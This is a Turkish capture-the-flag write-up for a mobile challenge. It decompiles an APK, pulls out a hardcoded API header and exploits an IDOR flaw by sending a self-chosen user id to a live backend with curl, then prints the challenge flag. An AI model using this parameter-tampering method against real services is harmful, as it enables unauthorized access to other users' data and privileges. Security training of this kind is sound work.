# 📱 IDOR - Mobile Challenge

**Kategori:** Mobile  
**Zorluk:** Orta  
**Puan:** 2000

**Challenge Dosyası:** app-release.apk  
Kaynak: GitHub - pitoctf

---

## 🎯 Challenge Amacı

Android APK dosyası içerisinde **IDOR (Insecure Direct Object Reference)** zafiyetini tespit etmek ve istismar ederek flag elde etmek.

**Strateji:**

* APK decompile
* API endpoint analizi
* Yetki kontrolü testleri
* IDOR exploit

---

## ❓ IDOR Nedir?

**Insecure Direct Object Reference**, uygulamanın kullanıcıdan gelen **ID, user_id vb. nesne referanslarını** yetki kontrolü yapmadan kullanmasıdır.

Bu zafiyet sayesinde:

* Kullanıcı, yetkisi olmayan verilere erişebilir
* ID parametreleri değiştirilerek başka kullanıcıların verileri alınabilir

---

## ✅ Çözüm Adımları

### 📥 1. APK İndirme ve İlk Analiz

```bash
wget https://github.com/cihangungor/pitoctf/raw/main/app-release.apk
file app-release.apk
```

**Çıktı:**

```
app-release.apk: Android package (APK)
```

---

### 🔧 2. APK Decompile (JADX)

```bash
jadx -d output app-release.apk
cd output/sources
```

**Klasör Yapısı:**

```
output/
├── resources/
└── sources/
    └── com/example/ctfchallenge/
        ├── MainActivity.java
        ├── ApiClient.java
        └── ApiResponse.java
```

---

### 📝 3. MainActivity.java Analizi

```java
private final void setupApiClient() {
    this.apiClient = new ApiClient(this, "https://64.226.74.243:5241");
}
```

📌 **API Base URL bulundu:**

```
https://64.226.74.243:5241
```

---

### 🔐 4. ApiClient.java Analizi

Kritik bulgular:

```java
this.secretHeader = "X-Mob";
this.secretValue = "RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ";
```

**Endpoint’ler:**

* `/api/register`
* `/api/getFlag`

**Fake Flag Decode:**

```bash
echo "RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" | base64 -d
```

```
Flag{OkadarKolayDegil}
```

⚠️ Bu **fake flag**tir.

---

## 🌐 5. API Testleri

### Test 1: Kullanıcı Kaydı

```bash
curl -k -X POST "https://64.226.74.243:5241/api/register" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"testuser999","password":"pass123"}'
```

**Response:**

```json
{
  "id": 0,
  "message": "Registration successful",
  "status": "success",
  "user": "testuser999"
}
```

---

### Test 2: Flag Alma Denemesi

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"testuser999","password":"pass123"}'
```

❌ Normal kullanıcılar flag alamıyor.

---

## 🔓 6. Admin Kullanıcı Testi

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"admin","password":"admin123"}'
```

📌 Admin kullanıcısı mevcut fakat **yetkili değil**.

---

## 🎯 7. IDOR Zafiyeti Keşfi

### 💡 Hipotez

Kayıt sırasında `id` parametresi **backend tarafından doğrulanmıyor olabilir**.

### Test: ID Manipülasyonu

```bash
curl -k -X POST "https://64.226.74.243:5241/api/register" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"hacker999","password":"pass123","id":999}'
```

🎉 **Başarılı!** Kullanıcı **ID:999** ile oluşturuldu.

---

### 🚩 Flag Alma

```bash
curl -k -X POST "https://64.226.74.243:5241/api/getFlag" \
  -H "Content-Type: application/json" \
  -H "X-Mob: RmxhZ3tPa2FkYXJLb2xheURlZ2lsfQ" \
  -d '{"username":"hacker999","password":"pass123"}'
```

**Response:**

```json
{
  "flag": "CTF{M0b1l3_4P1_M4n1pul4t10n_SSLBYPASSED_IDORFOUND_5000DolarBounty}",
  "message": "Congratulations! You've solved the challenge!",
  "status": "success"
}
```

---

## 🚩 FLAG

```
CTF{M0b1l3_4P1_M4n1pul4t10n_SSLBYPASSED_IDORFOUND_5000DolarBounty}
```

---

## 🛠️ Kullanılan Araçlar

* **JADX** – APK decompile
* **curl** – API testleri
* **strings** – Binary analiz
* **base64** – Decode

---

## 🧠 Sonuç

Bu challenge’da backend tarafında **yetki kontrolü yapılmadan ID parametresinin kabul edilmesi**, klasik bir **IDOR zafiyetine** yol açmıştır.

Mobil uygulamalarda:

* Client-side veriye asla güvenilmemeli
* ID alanları backend’de doğrulanmalı
* Rol ve yetki kontrolleri zorunlu olmalıdır
